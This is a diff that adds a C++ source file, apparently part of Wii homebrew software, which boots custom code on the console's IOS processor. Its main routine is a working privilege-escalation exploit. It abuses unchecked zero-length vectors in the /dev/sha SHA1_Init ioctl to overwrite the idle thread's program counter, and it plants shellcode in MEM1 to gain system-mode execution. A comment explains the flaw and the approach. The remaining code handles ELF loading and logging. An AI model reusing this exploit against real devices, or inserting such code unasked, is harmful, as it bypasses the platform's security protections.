@@ -1,0 +1,123 @@
+#include "IOSBoot.hpp"
+
+#include <new>
+#include <string.h>
+#include <unistd.h>
+
+constexpr u32 VFILE_ADDR = 0x91000000;
+constexpr u32 VFILE_SIZE = 0x100000;
+
+template<u32 TSize>
+struct VFile
+{
+    static constexpr u32 MAGIC = 0x46494C45; /* FILE */
+
+    VFile(const void* data, u32 len)
+        : m_magic(MAGIC),
+          m_length(len),
+          m_pos(0)
+    {
+        ASSERT(len <= TSize);
+        memcpy(m_data, data, len);
+        DCFlushRange(reinterpret_cast<void*>(this), 32 + len);
+    }
+
+    u32 m_magic;
+    u32 m_length;
+    u32 m_pos;
+    u32 m_pad[8 - 3];
+    u8 m_data[TSize];
+};
+
+
+/* 
+ * Performs an IOS exploit and branches to the entrypoint in system mode.
+ * 
+ * Exploit summary:
+ * - IOS does not check validation of vectors with length 0.
+ * - All memory regions mapped as readable are executable.
+ * - NULL/0 points to the beginning of MEM1.
+ * - The /dev/sha resource manager, part of IOSC, runs in system mode.
+ * - It's obvious basically none of the code was audited at all.
+ * 
+ * IOCTL 0 (SHA1_Init) writes to the context vector (1) without checking the
+ * length at all. Two of the 32-bit values it initializes are zero.
+ * 
+ * Common approach: Point the context vector to the LR on the stack and then
+ * take control after return.
+ * A much more stable approach taken here: Overwrite the PC of the idle thread,
+ * which should always have its context start at 0xFFFE0000 in memory (across
+ * IOS versions).
+ */
+s32 IOSBoot::Entry(u32 entrypoint)
+{
+    IOS::ResourceCtrl<s32> sha("/dev/sha");
+    if (sha.fd() < 0)
+        return sha.fd();
+    
+    irse::Log(LogS::Core, LogL::INFO, "Exploit: Setting up MEM1");
+    u32* mem1 = reinterpret_cast<u32*>(MEM1_BASE);
+    mem1[0] = 0x4902468D; // ldr r1, =0x10100000; mov pc, r1;
+    mem1[1] = 0x49024788; // ldr r1, =entrypoint; blx r1;
+    mem1[2] = 0xE7FE0000; // deadlock
+    mem1[3] = 0x10100000;
+    mem1[4] = entrypoint;
+    DCFlushRange(MEM1_BASE, 32);
+    
+    IOS::Vector vec[3];
+    vec[0].data = NULL;
+    vec[0].len = 0;
+    vec[1].data = reinterpret_cast<void*>(0xFFFE0028);
+    vec[1].len = 0;
+    vec[2].data = NULL;
+    vec[2].len = 0;
+
+    irse::Log(LogS::Core, LogL::INFO, "Exploit: Doing exploit call");
+    return sha.ioctlv(0, 1, 2, vec);
+}
+
+extern u8 es_bin[];
+
+/* Async ELF launch */
+s32 IOSBoot::Launch(const void* data, u32 len)
+{
+    new (reinterpret_cast<void*>(VFILE_ADDR)) VFile<VFILE_SIZE>(data, len);
+
+    return Entry(reinterpret_cast<u32>(es_bin) & ~0xC0000000);
+}
+
+s32 IOSBoot::Log::Callback(s32 result, [[maybe_unused]] void* usrdata)
+{
+    IOSBoot::Log* obj = reinterpret_cast<IOSBoot::Log*>(usrdata);
+
+    if (result < 0) {
+        irse::Log(LogS::Core, LogL::ERROR, "/dev/stdout error: %d", result);
+        return 0;
+    }
+    LogL level = static_cast<LogL>(result);
+    irse::Log(LogS::IOS, level, "%s", obj->logBuffer);
+    obj->restartEvent();
+    return 0;
+}
+
+IOSBoot::Log::Log()
+{
+    if (this->logRM.fd() == static_cast<s32>(IOSErr::NotFound)) {
+        /* Unfortunately there isn't really a way to detect the moment the log
+         * resource manager is created, so we just have to keep trying until it
+         * succeeds. */
+        for (s32 i = 0; i < 12; i++) {
+            usleep(1000);
+            new (&this->logRM) IOS::ResourceCtrl<s32>("/dev/stdout");
+            if (this->logRM.fd() != static_cast<s32>(IOSErr::NotFound))
+                break;
+        }
+    }
+    if (this->logRM.fd() < 0) {
+
+        irse::Log(LogS::Core, LogL::ERROR,
+            "/dev/stdout open error: %d", this->logRM.fd());
+        return;
+    }
+    this->restartEvent();
+}
